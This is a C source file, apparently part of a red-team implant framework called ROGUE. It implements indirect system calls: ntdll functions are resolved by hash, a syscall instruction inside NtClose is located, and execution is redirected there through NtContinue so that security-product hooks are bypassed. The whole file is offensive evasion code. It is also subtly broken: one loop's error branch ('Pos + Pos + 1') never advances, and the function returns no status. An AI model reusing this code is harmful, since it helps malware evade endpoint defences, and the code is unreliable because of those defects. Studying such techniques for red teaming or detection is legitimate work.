/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/* Unknown definition */
VOID NTAPI chkstk( VOID );

typedef struct
{
	D_API( RtlCaptureContext );
	D_API( NtContinue );
	D_API( NtClose );
	D_API( chkstk );
} API ;

/* API Hashes */
#define H_API_RTLCAPTURECONTEXT	0xeba8d910 /* RtlCaptureContext */
#define H_API_NTCONTINUE	0xfc3a6c2c /* NtContinue */
#define H_API_NTCLOSE		0x40d6e69d /* NtClose */
#define H_API_CHKSTK		0x5a88e82b /* chkstk */ 

/* LIB Hashes */
#define H_LIB_NTDLL		0x1edab0ed /* ntdll.dll */

/* STR Hashes */
#define H_STR_TEXT		0x0b6ea858 /* .text */

/*!
 *
 * Purpose:
 *
 * Executes the provided system call ID in an unhooked
 * region of NTDLL. Uses HDE64 to locate an unused seg
 * containing a syscall instructions, and directs the
 * execution to it.
 *
 * Uses the 'shadow space' inside of the function to
 * insert a return address to adjust RSP and properly
 * return in the external 'SystemCallReturn' if args
 * are greater than 5.
 *
!*/
D_SEC( B ) NTSTATUS NTAPI ExecuteSystemCall( _In_ UINT32 Id, _In_ UINT32 Argc, ... )
{
	API			Api;
	hde64s			Hde;
	va_list			Lst;
	CONTEXT			Ctx;

	ULONG			Pos = 0;

	PVOID			Rip = NULL;
	PVOID			Adj = NULL;
	PVOID			Ret = NULL;
	PUINT8			Ins = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
	RtlSecureZeroMemory( &Lst, sizeof( Lst ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	Api.RtlCaptureContext = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
	Api.NtContinue        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
	Api.NtClose           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );
	Api.chkstk            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_CHKSTK );

	/* Enumerate .text to look for the syscall instruction */
	for ( Pos = 0 ;; ) {
		hde64_disasm( C_PTR( U_PTR( Api.NtClose ) + Pos ), &Hde );

		/* Did we succeed in the disasembly */
		if ( !( Hde.flags & F_ERROR ) ) {

			Ins = C_PTR( U_PTR( Api.NtClose ) + Pos );

			/* Is this a system call instruction? */
			if ( Hde.len == 2 && Ins[ 0 ] == 0x0f && Ins[ 1 ] == 0x05 ) {
				/* Is pointer to the 'syscall' instruction */
				Rip = C_PTR( U_PTR( Api.NtClose ) + Pos );
				break;
			};
			/* Move onto the next instruction */
			Pos = Pos + Hde.len;
		} else 
		{ 
			/* Abort! Increment by one */
			Pos = Pos + 1;
		};
	};

	/* Enumerate .text to look for the add rsp, 0x10 */
	for ( Pos = 0 ;; ) {
		hde64_disasm( C_PTR( U_PTR( Api.chkstk ) + Pos ), &Hde );

		if ( !( Hde.flags & F_ERROR ) ) {

			Ins = C_PTR( U_PTR( Api.chkstk ) + Pos );

			/* Is this a 'add rsp, <value>' instruction */
			if ( Hde.len == 4 && Ins[ 0 ] == 0x48 && Ins[ 1 ] == 0x83 && Ins[ 2 ] == 0xc4 ) {
				/* Is a pointer to the 'add rsp, <value>' instruction */
				Ret = C_PTR( U_PTR( Api.chkstk ) + Pos );
				break;
			};
			/* Move onto the next instruction */
			Pos = Pos + Hde.len;
		} else 
		{
			/* Abort! Increment by one */
			Pos + Pos + 1;
		};
	};

	/* Get information about the thread */
	Ctx.ContextFlags = CONTEXT_FULL;
	Api.RtlCaptureContext( &Ctx );

	/* Setup call frame */
	Ctx.ContextFlags = CONTEXT_FULL;
	Ctx.Rip = U_PTR( Rip );
	Ctx.Rsp = U_PTR( __builtin_frame_address( 0 ) + sizeof( PVOID ) );
	Ctx.Rsp = U_PTR( Ctx.Rsp - 16 );
	*( ULONG_PTR volatile * )( Ctx.Rsp ) = U_PTR( Ret );

	/* Execute! */
	Api.NtContinue( &Ctx, FALSE );
};
